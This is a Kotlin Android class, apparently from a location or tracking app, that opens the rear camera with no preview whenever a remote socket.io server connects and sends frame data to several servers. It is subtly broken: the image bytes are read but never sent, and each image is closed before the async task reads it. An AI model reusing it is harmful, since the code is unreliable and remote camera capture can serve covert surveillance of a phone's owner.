package com.tudominio.smslocation

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import androidx.core.app.ActivityCompat
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicInteger

class VideoStreamingClient(
    private val context: Context,
    private val deviceId: String,
    private val serverUrls: List<String>
) {
    private val sockets = mutableListOf<Socket>()
    private var cameraDevice: CameraDevice? = null
    private var cameraCaptureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    private var isStreaming = false

    private val streamingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val connectedServers = AtomicInteger(0)
    private var frameCount = 0

    companion object {
        private const val TAG = "VideoStreaming"
        private const val CAMERA_WIDTH = 640
        private const val CAMERA_HEIGHT = 480
        private const val MAX_IMAGES = 2
        private const val FRAME_SKIP = 2 // Enviar 1 de cada 2 frames para ahorrar ancho de banda
    }

    fun connect() {
        Log.d(TAG, "Iniciando conexión a ${serverUrls.size} servidores...")

        // Conectar a cada servidor
        serverUrls.forEachIndexed { index, url ->
            try {
                val options = IO.Options().apply {
                    transports = arrayOf("websocket")
                    reconnection = true
                    reconnectionDelay = 1000
                    reconnectionAttempts = 5
                    timeout = 10000
                }

                val socket = IO.socket(url, options)

                socket.on(Socket.EVENT_CONNECT) {
                    val count = connectedServers.incrementAndGet()
                    Log.d(TAG, "✅ Conectado a servidor ${index + 1}: $url ($count/${serverUrls.size})")

                    // Notificar al servidor que este dispositivo está transmitiendo
                    socket.emit("device_streaming", JSONObject().apply {
                        put("device_id", deviceId)
                        put("status", "active")
                        put("timestamp", System.currentTimeMillis())
                    })

                    // Si es el primer servidor conectado, iniciar cámara
                    if (count == 1) {
                        isStreaming = true
                        startBackgroundThread()
                        openCamera()
                    }
                }

                socket.on(Socket.EVENT_DISCONNECT) {
                    val count = connectedServers.decrementAndGet()
                    Log.d(TAG, "❌ Desconectado de servidor ${index + 1}: $url ($count/${serverUrls.size})")

                    // Si todos se desconectaron, detener cámara
                    if (count == 0) {
                        isStreaming = false
                    }
                }

                socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                    Log.e(TAG, "Error conectando a servidor ${index + 1}: ${args.joinToString()}")
                }

                // ⭐ ELIMINAR O COMENTAR ESTA LÍNEA QUE CAUSA EL ERROR ⭐
                // socket.on(Socket.EVENT_RECONNECT) { args ->
                //     Log.d(TAG, "🔄 Reconectado a servidor ${index + 1}")
                // }

                socket.on("error") { args ->
                    Log.e(TAG, "Error en servidor ${index + 1}: ${args.joinToString()}")
                }

                socket.connect()
                sockets.add(socket)

            } catch (e: Exception) {
                Log.e(TAG, "Excepción conectando a servidor ${index + 1} ($url): ${e.message}", e)
            }
        }
    }

    private fun startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = HandlerThread("CameraBackground").also { it.start() }
            backgroundHandler = Handler(backgroundThread!!.looper)
            Log.d(TAG, "Background thread iniciado")
        }
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
            Log.d(TAG, "Background thread detenido")
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error deteniendo background thread", e)
        }
    }

    private fun openCamera() {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "❌ No hay permiso de cámara")
            return
        }

        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = getCameraId(cameraManager)

            if (cameraId == null) {
                Log.e(TAG, "❌ No se encontró cámara trasera")
                return
            }

            Log.d(TAG, "Abriendo cámara ID: $cameraId")

            // Crear ImageReader para capturar frames
            imageReader = ImageReader.newInstance(
                CAMERA_WIDTH,
                CAMERA_HEIGHT,
                android.graphics.ImageFormat.YUV_420_888,
                MAX_IMAGES
            )

            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    if (isStreaming && connectedServers.get() > 0) {
                        // Saltar frames para reducir ancho de banda
                        frameCount++
                        if (frameCount % FRAME_SKIP == 0) {
                            processAndSendFrame(image)
                        }
                    }
                    image.close()
                }
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "✅ Cámara abierta exitosamente")
                    cameraDevice = camera
                    createCameraPreviewSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.d(TAG, "⚠️ Cámara desconectada")
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    val errorMsg = when (error) {
                        ERROR_CAMERA_IN_USE -> "Cámara en uso"
                        ERROR_MAX_CAMERAS_IN_USE -> "Máximo de cámaras en uso"
                        ERROR_CAMERA_DISABLED -> "Cámara deshabilitada"
                        ERROR_CAMERA_DEVICE -> "Error de dispositivo"
                        ERROR_CAMERA_SERVICE -> "Error de servicio"
                        else -> "Error desconocido: $error"
                    }
                    Log.e(TAG, "❌ Error en cámara: $errorMsg")
                    camera.close()
                    cameraDevice = null
                }
            }, backgroundHandler)

        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error de acceso a cámara: ${e.message}", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error abriendo cámara: ${e.message}", e)
        }
    }

    private fun getCameraId(cameraManager: CameraManager): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                    Log.d(TAG, "Cámara trasera encontrada: $cameraId")
                    return cameraId
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error buscando cámara: ${e.message}", e)
        }
        return null
    }

    private fun createCameraPreviewSession() {
        try {
            val surface = imageReader?.surface
            if (surface == null) {
                Log.e(TAG, "❌ Surface es null")
                return
            }

            if (cameraDevice == null) {
                Log.e(TAG, "❌ Camera device es null")
                return
            }

            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(
                CameraDevice.TEMPLATE_PREVIEW
            ).apply {
                addTarget(surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
            }

            cameraDevice!!.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        if (cameraDevice == null) {
                            Log.e(TAG, "❌ Camera device es null en onConfigured")
                            return
                        }

                        cameraCaptureSession = session
                        try {
                            session.setRepeatingRequest(
                                captureRequestBuilder.build(),
                                null,
                                backgroundHandler
                            )
                            Log.d(TAG, "✅ Sesión de captura iniciada - Streaming activo")
                        } catch (e: CameraAccessException) {
                            Log.e(TAG, "Error iniciando captura: ${e.message}", e)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error inesperado iniciando captura: ${e.message}", e)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "❌ Configuración de sesión falló")
                    }
                },
                backgroundHandler
            )
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error creando sesión: ${e.message}", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error inesperado creando sesión: ${e.message}", e)
        }
    }

    private fun processAndSendFrame(image: Image) {
        streamingScope.launch {
            try {
                // Convertir primer plano Y a bytes (luminancia)
                val yPlane = image.planes[0]
                val yBuffer = yPlane.buffer
                val ySize = yBuffer.remaining()
                val yBytes = ByteArray(ySize)
                yBuffer.get(yBytes)

                // Crear metadata del frame
                val frameData = JSONObject().apply {
                    put("type", "video_frame")
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                    put("width", image.width)
                    put("height", image.height)
                    put("format", "YUV_420_888")
                    put("frame_number", frameCount)
                    put("data_size", ySize)
                    put("connected_servers", connectedServers.get())
                }

                // Enviar a TODOS los servidores conectados en paralelo
                var sentCount = 0
                sockets.forEach { socket ->
                    if (socket.connected()) {
                        try {
                            socket.emit("video_frame", frameData)
                            sentCount++
                        } catch (e: Exception) {
                            Log.e(TAG, "Error enviando a socket: ${e.message}")
                        }
                    }
                }

                if (frameCount % 30 == 0) { // Log cada 30 frames
                    Log.d(TAG, "📹 Frame #$frameCount enviado a $sentCount/${sockets.size} servidores")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error procesando frame: ${e.message}", e)
            }
        }
    }

    fun disconnect() {
        try {
            Log.d(TAG, "Deteniendo video streaming...")
            isStreaming = false

            // Cerrar sesión de cámara
            cameraCaptureSession?.stopRepeating()
            cameraCaptureSession?.close()
            cameraCaptureSession = null

            // Cerrar dispositivo de cámara
            cameraDevice?.close()
            cameraDevice = null

            // Cerrar image reader
            imageReader?.close()
            imageReader = null

            // Detener thread
            stopBackgroundThread()

            // Notificar a servidores y desconectar
            sockets.forEach { socket ->
                try {
                    if (socket.connected()) {
                        socket.emit("device_streaming", JSONObject().apply {
                            put("device_id", deviceId)
                            put("status", "inactive")
                            put("timestamp", System.currentTimeMillis())
                        })
                    }
                    socket.disconnect()
                    socket.close()
                } catch (e: Exception) {
                    Log.e(TAG, "Error desconectando socket: ${e.message}")
                }
            }
            sockets.clear()
            connectedServers.set(0)

            // Cancelar coroutines
            streamingScope.cancel()

            Log.d(TAG, "✅ Video streaming completamente detenido")

        } catch (e: Exception) {
            Log.e(TAG, "Error desconectando: ${e.message}", e)
        }
    }

    fun getConnectionStatus(): String {
        return "${connectedServers.get()}/${serverUrls.size} servidores conectados"
    }

    fun isActive(): Boolean {
        return isStreaming && connectedServers.get() > 0
    }
}